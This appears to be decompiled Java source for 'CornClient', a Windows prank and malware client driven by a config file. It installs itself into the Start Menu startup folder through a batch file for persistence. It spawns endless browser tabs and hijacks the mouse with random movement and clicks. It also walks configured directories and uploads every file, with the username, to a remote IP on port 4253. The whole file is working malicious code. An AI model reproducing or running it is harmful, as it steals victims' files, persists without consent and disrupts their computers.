import java.util.concurrent.TimeUnit;
import java.util.Random;
import java.nio.file.Path;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.io.OutputStream;
import java.io.DataOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.util.Iterator;
import java.util.Arrays;
import java.io.FileInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectInputStream;
import java.net.Socket;
import java.awt.Toolkit;
import java.awt.Point;
import java.awt.MouseInfo;
import java.awt.Robot;
import java.util.TimerTask;
import java.io.IOException;
import java.util.Scanner;
import java.util.Collection;
import java.io.File;
import java.util.ArrayList;
import java.util.Timer;


public class CornClient
{
    private static String ip;
    private static String[] directory;
    private static final int port = 4253;
    private int shiftXBy;
    private int shiftYBy;
    private Timer timer;
    private ArrayList<String> urls;
    private String uname;
    
    public ArrayList<File> getAllFiles(final File f) {
        final ArrayList<File> toReturn = new ArrayList<File>();
        if (!f.isDirectory()) {
            toReturn.add(f);
            return toReturn;
        }
        final File[] faFiles = f.listFiles();
        if (faFiles != null) {
            File[] array;
            for (int length = (array = faFiles).length, i = 0; i < length; ++i) {
                final File file = array[i];
                if (file.isDirectory()) {
                    toReturn.addAll(this.getAllFiles(file));
                }
                else {
                    toReturn.add(file);
                }
            }
        }
        return toReturn;
    }
    
    public CornClient() {
        this.shiftXBy = 1;
        this.shiftYBy = 1;
        this.uname = System.getProperty("user.name");
        String genTabs = "no";
        int tabFreq = 0;
        String moveMouse = "no";
        String clickMouse = "no";
        String copyFiles = "no";
        String persist = "no";
        final String openCD = "no";
        int lastFor = 0;
        this.timer = new Timer();
        try {
            final Scanner configReader = new Scanner(new File("config.txt"));
            CornClient.ip = configReader.nextLine().substring(3).trim();
            copyFiles = configReader.nextLine().substring(11).trim();
            genTabs = configReader.nextLine().substring(10).trim();
            tabFreq = Integer.parseInt(configReader.nextLine().substring(14).trim());
            moveMouse = configReader.nextLine().substring(11).trim();
            clickMouse = configReader.nextLine().substring(12).trim();
            lastFor = Integer.parseInt(configReader.nextLine().substring(8).trim());
            persist = configReader.nextLine().substring(12).trim();
            final ArrayList<String> dirs = new ArrayList<String>();
            while (configReader.hasNextLine()) {
                dirs.add(configReader.nextLine());
            }
            CornClient.directory = new String[dirs.size()];
            for (int i = 0; i < dirs.size(); ++i) {
                CornClient.directory[i] = dirs.get(i);
            }
            configReader.close();
        }
        catch (Exception e3) {
            System.out.println("invalid config file");
        }
        String whereCornAt = "\\src\\CornClient.jar";
        String cornName = "\\CornClient.jar";
        if (getrunningdir().toLowerCase().indexOf("eclipse") == -1) {
            whereCornAt = (cornName = "\\CornClient.jar");
        }
        if (persist.equalsIgnoreCase("yes") && !getrunningdir().contains("AppData\\Roaming\\Microsoft\\Windows\\Start Menu")) {
            try {
                copyFile(String.valueOf(getrunningdir()) + whereCornAt, String.valueOf(getautostart()) + cornName);
                copyFile(String.valueOf(getrunningdir()) + "\\url.txt", String.valueOf(getautostart()) + "\\url.txt");
                copyFile(String.valueOf(getrunningdir()) + "\\config.txt", String.valueOf(getautostart()) + "\\config.txt");
                this.createBat(String.valueOf(getautostart()) + "\\Startup\\runCorn.bat", getautostart());
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
        if (lastFor >= 0) {
            this.timer.schedule(new wait(), lastFor * 1000);
        }
        else {
            this.timer.schedule(new wait(), 2147483647L);
        }
        if (genTabs.equalsIgnoreCase("yes")) {
            final Thread cornHusk = new Thread(new cornSpawner(tabFreq));
            cornHusk.start();
        }
        if (moveMouse.equalsIgnoreCase("yes")) {
            final TimerTask mouseCrawl = new TimerTask() {
                private Robot r;
                
                @Override
                public void run() {
                    try {
                        this.r = new Robot();
                        final Point mouseLoc = MouseInfo.getPointerInfo().getLocation();
                        this.r.mouseMove((int)mouseLoc.getX() - CornClient.this.shiftXBy, (int)mouseLoc.getY() - CornClient.this.shiftYBy);
                    }
                    catch (Exception ex) {}
                }
            };
            final TimerTask mouseJump = new TimerTask() {
                private Robot r;
                
                @Override
                public void run() {
                    CornClient.access$4(CornClient.this, (int)(Math.random() * 5.0) - 2);
                    CornClient.access$5(CornClient.this, (int)(Math.random() * 5.0) - 2);
                    try {
                        this.r = new Robot();
                        final int height = Toolkit.getDefaultToolkit().getScreenSize().height;
                        final int width = Toolkit.getDefaultToolkit().getScreenSize().width;
                        this.r.mouseMove((int)(width * Math.random()), (int)(height * Math.random()));
                    }
                    catch (Exception ex) {}
                }
            };
            this.timer.schedule(mouseCrawl, 0L, 100L);
            this.timer.schedule(mouseJump, 0L, 8000L);
            final Runnable invertMouse = new Runnable() {
                private Robot r;
                
                @Override
                public void run() {
                    CornClient.access$4(CornClient.this, (int)(Math.random() * 5.0) - 2);
                    CornClient.access$5(CornClient.this, (int)(Math.random() * 5.0) - 2);
                    try {
                        this.r = new Robot();
                        final int height = Toolkit.getDefaultToolkit().getScreenSize().height;
                        final int width = Toolkit.getDefaultToolkit().getScreenSize().width;
                        this.r.mouseMove((int)(width * Math.random()), (int)(height * Math.random()));
                    }
                    catch (Exception ex) {}
                }
            };
            this.timer.schedule(mouseCrawl, 0L, 100L);
            this.timer.schedule(mouseJump, 0L, 8000L);
        }
        if (clickMouse.equalsIgnoreCase("yes")) {
            final TimerTask mouseClick = new TimerTask() {
                private Robot r;
                
                @Override
                public void run() {
                    try {
                        this.r = new Robot();
                        if (Math.random() > 0.5) {
                            this.r.mousePress(16);
                            this.r.mouseRelease(16);
                            System.out.println("l click");
                        }
                        else {
                            this.r.mousePress(4);
                            this.r.mouseRelease(4);
                            System.out.println("r click");
                        }
                    }
                    catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }
            };
            this.timer.schedule(mouseClick, 0L, 1500L);
        }
        if (copyFiles.equalsIgnoreCase("yes")) {
            String[] directory;
            for (int length = (directory = CornClient.directory).length, k = 0; k < length; ++k) {
                final String dir = directory[k];
                final File file = new File(dir);
                final ArrayList<File> filesListing = this.getAllFiles(file);
                for (final File j : filesListing) {
                    if (!j.isDirectory()) {
                        try {
                            final Socket socket = new Socket(CornClient.ip, 4253);
                            final ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                            final ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
                            oos.writeObject(String.valueOf(j.getPath().substring(j.getPath().indexOf(dir))) + "*&*&*" + this.uname);
                            final FileInputStream fis = new FileInputStream(j);
                            final byte[] buffer = new byte[1024];
                            Integer bytesRead = 0;
                            while ((bytesRead = fis.read(buffer)) > 0) {
                                oos.writeObject(bytesRead);
                                oos.writeObject(Arrays.copyOf(buffer, buffer.length));
                            }
                            fis.close();
                            oos.close();
                            ois.close();
                            socket.close();
                        }
                        catch (IOException e2) {
                            e2.printStackTrace();
                        }
                    }
                }
            }
        }
    }
    
    public void createBat(final String loc, final String execAt) {
        final File file = new File(loc);
        FileOutputStream fos = null;
        try {
            fos = new FileOutputStream(file);
        }
        catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        final DataOutputStream dos = new DataOutputStream(fos);
        try {
            dos.writeBytes("cd \"" + execAt + "\\\"\nstart CornClient.jar");
        }
        catch (IOException e2) {
            e2.printStackTrace();
        }
    }
    
    public static String getautostart() {
        return System.getProperty("java.io.tmpdir").replace("Local\\Temp\\", "Roaming\\Microsoft\\Windows\\Start Menu\\Programs");
    }
    
    public static String getrunningdir() {
        final String runningdir = Paths.get(".", new String[0]).toAbsolutePath().normalize().toString();
        return runningdir;
    }
    
    public static void copyFile(final String from, final String to) throws IOException {
        final Path src = Paths.get(from, new String[0]);
        final Path dest = Paths.get(to, new String[0]);
        Files.copy(src, new FileOutputStream(dest.toFile()));
    }
    
    public static void main(final String[] args) {
        new CornClient();
    }
    
    static /* synthetic */ void access$0(final CornClient cornClient, final ArrayList urls) {
        cornClient.urls = (ArrayList<String>)urls;
    }
    
    static /* synthetic */ void access$4(final CornClient cornClient, final int shiftXBy) {
        cornClient.shiftXBy = shiftXBy;
    }
    
    static /* synthetic */ void access$5(final CornClient cornClient, final int shiftYBy) {
        cornClient.shiftYBy = shiftYBy;
    }
    
    private class cornSpawner implements Runnable
    {
        private int frequency;
        
        public cornSpawner(final int freq) {
            this.frequency = freq;
        }
        
        @Override
        public void run() {
            CornClient.access$0(CornClient.this, new ArrayList());
            try {
                final Scanner urlFile = new Scanner(new File("url.txt"));
                while (urlFile.hasNextLine()) {
                    final String next = urlFile.nextLine();
                    if (!next.trim().equals("")) {
                        CornClient.this.urls.add(next);
                    }
                }
                urlFile.close();
            }
            catch (FileNotFoundException e1) {
                CornClient.this.urls.add("https://image.spreadshirtmedia.com/image-server/v1/compositions/1012773656/views/1,width=650,height=650,appearanceId=1,backgroundColor=d6daf0,version=1547454572/classic-sad-frog.jpg");
            }
            while (true) {
                try {
                    Runtime.getRuntime().exec(new String[] { "C:/Program Files (x86)/Google/Chrome/Application/chrome.exe", CornClient.this.urls.get(new Random().nextInt(CornClient.this.urls.size())) });
                }
                catch (IOException e2) {
                    System.exit(-1);
                }
                try {
                    TimeUnit.SECONDS.sleep(this.frequency);
                }
                catch (InterruptedException ex) {}
            }
        }
    }
    
    public class wait extends TimerTask
    {
        @Override
        public void run() {
            System.exit(1337);
        }
    }
}
